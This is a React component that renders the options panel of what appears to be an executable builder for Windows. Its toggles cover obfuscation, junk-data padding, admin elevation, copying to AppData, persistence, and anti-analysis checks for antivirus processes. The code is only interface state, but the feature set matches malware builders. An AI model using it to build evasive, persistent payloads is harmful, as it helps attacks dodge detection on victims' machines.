import { useMemo } from 'react';
import { useTranslation } from 'react-i18next';
import { Button, Card, Label, Popover, Slider, Tabs } from '@heroui/react';
import { ListView } from '@components/list-view';
import type { Selection } from 'react-aria-components';
import { CircleInfo } from '@gravity-ui/icons';
import type { BuildConfigRequest } from '../../types/models';
import type { AntiAnalysisToggle, ToggleOption } from './constants';

interface BuilderOptionsCardProps {
  config: BuildConfigRequest;
  set: <K extends keyof BuildConfigRequest>(key: K, value: BuildConfigRequest[K]) => void;
}

const BUILD_OPTIONS: ToggleOption[] = [
  { id: 'stripSymbols', key: 'stripSymbols' },
  { id: 'enableObfuscation', key: 'enableObfuscation' },
  { id: 'injectJunkData', key: 'injectJunkData' },
];

const PERSISTENCE_OPTIONS: ToggleOption[] = [
  { id: 'requireAdmin', key: 'requireAdmin' },
  { id: 'copyToAppData', key: 'copyToAppData' },
  { id: 'enablePersistence', key: 'enablePersistence' },
];

const ANTI_ANALYSIS_OPTIONS: AntiAnalysisToggle[] = [
  { id: 'checkTestSigning', key: 'checkTestSigning' },
  { id: 'checkAvProcesses', key: 'checkAvProcesses' },
];

export function BuilderOptionsCard({ config, set }: BuilderOptionsCardProps) {
  const { t } = useTranslation();

  const selectedBuildKeys = useMemo(
    () => new Set(BUILD_OPTIONS.filter((o) => !!config[o.key]).map((o) => o.id)),
    [config.stripSymbols, config.enableObfuscation, config.injectJunkData],
  );

  const selectedPersistenceKeys = useMemo(
    () => new Set(PERSISTENCE_OPTIONS.filter((o) => !!config[o.key]).map((o) => o.id)),
    [config.requireAdmin, config.copyToAppData, config.enablePersistence],
  );

  const selectedAntiAnalysisKeys = useMemo(
    () => new Set(ANTI_ANALYSIS_OPTIONS.filter((o) => !!config.antiAnalysis[o.key]).map((o) => o.id)),
    [config.antiAnalysis],
  );

  const handleBuildSelectionChange = (keys: Selection) => {
    const s = keys as Set<string>;
    for (const opt of BUILD_OPTIONS) {
      set(opt.key, (s.has(opt.id) ? true : false) as BuildConfigRequest[typeof opt.key]);
    }
  };

  const handlePersistenceSelectionChange = (keys: Selection) => {
    const s = keys as Set<string>;
    for (const opt of PERSISTENCE_OPTIONS) {
      set(opt.key, (s.has(opt.id) ? true : false) as BuildConfigRequest[typeof opt.key]);
    }
  };

  const handleAntiAnalysisSelectionChange = (keys: Selection) => {
    const s = keys as Set<string>;
    const updated = { ...config.antiAnalysis };
    for (const opt of ANTI_ANALYSIS_OPTIONS) {
      (updated as any)[opt.key] = s.has(opt.id);
    }
    updated.enabled = s.size > 0;
    set('antiAnalysis', updated);
  };

  return (
    <>
      {/* Platform + Application Type */}
      <Card className="p-4">
        <div className="grid grid-cols-2 gap-6">
          <div>
            <h2 className="text-lg font-semibold mb-3">{t('builder.platform')}</h2>
            <Tabs
              selectedKey={config.platform}
              onSelectionChange={(key) => set('platform', String(key))}
            >
              <Tabs.List>
                <Tabs.Tab id="x64">Win x64<Tabs.Indicator /></Tabs.Tab>
                <Tabs.Tab id="x86">Win x86<Tabs.Indicator /></Tabs.Tab>
              </Tabs.List>
            </Tabs>
          </div>
          <div>
            <h2 className="text-lg font-semibold mb-3">{t('builder.applicationType')}</h2>
            <Tabs
              selectedKey={config.applicationType}
              onSelectionChange={(key) => set('applicationType', String(key))}
            >
              <Tabs.List>
                <Tabs.Tab id="Console">{t('builder.consoleApp')}<Tabs.Indicator /></Tabs.Tab>
                <Tabs.Tab id="Desktop">{t('builder.desktopApp')}<Tabs.Indicator /></Tabs.Tab>
              </Tabs.List>
            </Tabs>
            <p className="text-xs text-default-500 mt-2">
              {t(config.applicationType === 'Desktop' ? 'builder.desktopAppDesc' : 'builder.consoleAppDesc')}
            </p>
          </div>
        </div>
      </Card>

      {/* Build Options + Persistence + Anti-Analysis */}
      <Card className="p-4">
        <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
          <div>
            <h2 className="text-lg font-semibold mb-3">{t('builder.buildOptions')}</h2>
            <ListView
              aria-label={t('builder.buildOptions')}
              items={BUILD_OPTIONS}
              selectedKeys={selectedBuildKeys}
              selectionMode="multiple"
              variant="primary"
              onSelectionChange={handleBuildSelectionChange}
            >
              {(opt) => (
                <ListView.Item id={opt.id} textValue={t(`builder.${opt.id}`)}>
                  <ListView.ItemContent>
                    <div className="flex items-center justify-between w-full">
                      <ListView.Title>{t(`builder.${opt.id}`)}</ListView.Title>
                      <Popover>
                        <Button isIconOnly variant="ghost" className="h-8 w-8 min-w-0">
                          <CircleInfo className="h-6 w-6" />
                        </Button>
                        <Popover.Content className="max-w-64">
                          <Popover.Dialog>
                            <Popover.Heading className="text-sm">{t(`builder.${opt.id}`)}</Popover.Heading>
                            <p className="mt-1 text-xs text-default-500">{t(`builder.${opt.id}Desc`)}</p>
                          </Popover.Dialog>
                        </Popover.Content>
                      </Popover>
                    </div>
                  </ListView.ItemContent>
                </ListView.Item>
              )}
            </ListView>
            {config.injectJunkData && (
              <div className="mt-3 pl-4">
                <Slider
                  className="w-full max-w-xs"
                  value={config.junkDataMb}
                  minValue={1}
                  maxValue={200}
                  step={1}
                  onChange={(v) => set('junkDataMb', (Array.isArray(v) ? v[0] : v) ?? 10)}
                >
                  <Label>{t('builder.junkDataMb')}</Label>
                  <Slider.Output />
                  <Slider.Track>
                    <Slider.Fill />
                    <Slider.Thumb />
                  </Slider.Track>
                </Slider>
              </div>
            )}
          </div>
          <div>
            <h2 className="text-lg font-semibold mb-3">{t('builder.persistence')}</h2>
            <ListView
              aria-label={t('builder.persistence')}
              items={PERSISTENCE_OPTIONS}
              selectedKeys={selectedPersistenceKeys}
              selectionMode="multiple"
              variant="primary"
              onSelectionChange={handlePersistenceSelectionChange}
            >
              {(opt) => (
                <ListView.Item id={opt.id} textValue={t(`builder.${opt.id}`)}>
                  <ListView.ItemContent>
                    <div className="flex items-center justify-between w-full">
                      <ListView.Title>{t(`builder.${opt.id}`)}</ListView.Title>
                      <Popover>
                        <Button isIconOnly variant="ghost" className="h-8 w-8 min-w-0">
                          <CircleInfo className="h-6 w-6" />
                        </Button>
                        <Popover.Content className="max-w-64">
                          <Popover.Dialog>
                            <Popover.Heading className="text-sm">{t(`builder.${opt.id}`)}</Popover.Heading>
                            <p className="mt-1 text-xs text-default-500">{t(`builder.${opt.id}Desc`)}</p>
                          </Popover.Dialog>
                        </Popover.Content>
                      </Popover>
                    </div>
                  </ListView.ItemContent>
                </ListView.Item>
              )}
            </ListView>
          </div>
          <div>
            <h2 className="text-lg font-semibold mb-3">{t('builder.antiAnalysis')}</h2>
            <ListView
              aria-label={t('builder.antiAnalysis')}
              items={ANTI_ANALYSIS_OPTIONS}
              selectedKeys={selectedAntiAnalysisKeys}
              selectionMode="multiple"
              variant="primary"
              onSelectionChange={handleAntiAnalysisSelectionChange}
            >
              {(opt) => (
                <ListView.Item id={opt.id} textValue={t(`builder.${opt.id}`)}>
                  <ListView.ItemContent>
                    <div className="flex items-center justify-between w-full">
                      <ListView.Title>{t(`builder.${opt.id}`)}</ListView.Title>
                      <Popover>
                        <Button isIconOnly variant="ghost" className="h-8 w-8 min-w-0">
                          <CircleInfo className="h-6 w-6" />
                        </Button>
                        <Popover.Content className="max-w-64">
                          <Popover.Dialog>
                            <Popover.Heading className="text-sm">{t(`builder.${opt.id}`)}</Popover.Heading>
                            <p className="mt-1 text-xs text-default-500">{t(`builder.${opt.id}Desc`)}</p>
                          </Popover.Dialog>
                        </Popover.Content>
                      </Popover>
                    </div>
                  </ListView.ItemContent>
                </ListView.Item>
              )}
            </ListView>
          </div>
        </div>
      </Card>
    </>
  );
}
